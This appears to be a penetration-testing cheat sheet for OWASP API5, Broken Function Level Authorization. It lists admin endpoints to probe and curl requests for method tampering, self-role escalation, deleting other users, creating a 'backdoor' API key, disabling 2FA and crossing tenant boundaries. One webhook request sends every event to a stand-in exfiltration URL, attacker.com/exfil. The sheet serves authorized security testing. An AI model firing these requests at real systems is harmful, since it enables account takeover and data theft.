# BFLA Test Patterns — Broken Function Level Authorization
# OWASP API Security: API5 — Broken Function Level Authorization
# Severity: HIGH to CRITICAL

# ============================================================
# 1. ADMIN ENDPOINT DISCOVERY
# ============================================================

# If the app uses /api/v1/users, try:
GET /api/v1/admin/users
GET /api/v1/admin/dashboard
GET /api/v1/admin/settings
GET /api/v1/admin/config
GET /api/v1/admin/logs
GET /api/v1/admin/audit
GET /api/v1/admin/users/export
GET /api/v1/admin/billing
GET /api/v1/admin/analytics
GET /api/v1/admin/metrics

# Management endpoints
GET /api/v1/manage/users
GET /api/v1/management/users
GET /api/v1/internal/users
GET /api/v1/console/users
GET /api/v1/portal/admin

# Version variations
GET /api/v2/admin/users
GET /api/internal/v1/users
GET /api/debug/users
GET /api/test/users
GET /api/staging/users

# Common admin URL patterns
GET /admin
GET /administrator
GET /console
GET /dashboard
GET /manage
GET /management
GET /internal
GET /backoffice
GET /staff
GET /superadmin
GET /sysadmin

# ============================================================
# 2. HTTP METHOD TAMPERING
# ============================================================

# Regular user can GET but not DELETE? Try:
# Original (allowed):
curl -X GET -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/users/123

# Method tampering (should be denied):
curl -X DELETE -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/users/123
curl -X PUT -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/users/123 -d '{"role":"admin"}'
curl -X PATCH -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/users/123 -d '{"is_admin":true}'
curl -X POST -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/users -d '{"email":"new@test.com","role":"admin"}'

# Verb tunneling via headers
curl -X POST -H "Authorization: Bearer <USER_TOKEN>" -H "X-HTTP-Method-Override: DELETE" https://api.target.com/api/v1/users/123
curl -X POST -H "Authorization: Bearer <USER_TOKEN>" -H "X-HTTP-Method: PUT" https://api.target.com/api/v1/users/123
curl -X GET -H "Authorization: Bearer <USER_TOKEN>" -H "X-Method-Override: DELETE" https://api.target.com/api/v1/users/123

# ============================================================
# 3. ROLE ESCALATION VIA API
# ============================================================

# Self-role modification
curl -X PUT https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

curl -X PATCH https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"is_admin": true}'

curl -X PUT https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"permissions": ["read", "write", "admin", "delete"]}'

curl -X PUT https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"group": "administrators"}'

curl -X PUT https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"user_type": "superadmin"}'

# ============================================================
# 4. PRIVILEGE ESCALATION — ACCOUNT MANAGEMENT
# ============================================================

# Create admin account (regular user shouldn't be able to)
curl -X POST https://api.target.com/api/v1/users \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"email":"evil@attacker.com", "password":"test123", "role":"admin"}'

# Modify other user's role
curl -X PUT https://api.target.com/api/v1/users/VICTIM_ID \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"role": "disabled"}'

# Delete other users
curl -X DELETE https://api.target.com/api/v1/users/VICTIM_ID \
  -H "Authorization: Bearer <USER_TOKEN>"

# Invite with elevated role
curl -X POST https://api.target.com/api/v1/invitations \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com", "role":"owner"}'

# ============================================================
# 5. FUNCTION-LEVEL ACCESS TO DANGEROUS OPERATIONS
# ============================================================

# Data export (should be admin only)
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/users/export
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/data/export?format=csv
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/reports/generate

# Configuration changes
curl -X PUT https://api.target.com/api/v1/settings \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"allow_signup": true, "require_2fa": false}'

# Audit log access
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/audit-logs
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/logs?level=debug

# API key management
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/api-keys
curl -X POST https://api.target.com/api/v1/api-keys \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name":"backdoor","permissions":["*"]}'

# Webhook management
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/webhooks
curl -X POST https://api.target.com/api/v1/webhooks \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://attacker.com/exfil","events":["*"]}'

# ============================================================
# 6. MULTI-TENANT BOUNDARY BYPASS
# ============================================================

# Access other organization's data
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/orgs/OTHER_ORG_ID/users
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/orgs/OTHER_ORG_ID/settings
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/orgs/OTHER_ORG_ID/billing

# Switch tenant context
curl -X POST https://api.target.com/api/v1/switch-org \
  -H "Authorization: Bearer <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"org_id": "OTHER_ORG_ID"}'

# ============================================================
# 7. TESTING METHODOLOGY
# ============================================================

# Step 1: Map all endpoints with admin account (Burp Sitemap)
# Step 2: Replay every admin request with regular user token
# Step 3: Check response — any 200 OK with data = BFLA
# Step 4: Test with no auth header at all
# Step 5: Test with expired / invalid token
# Step 6: Check if admin-only fields appear in regular API responses
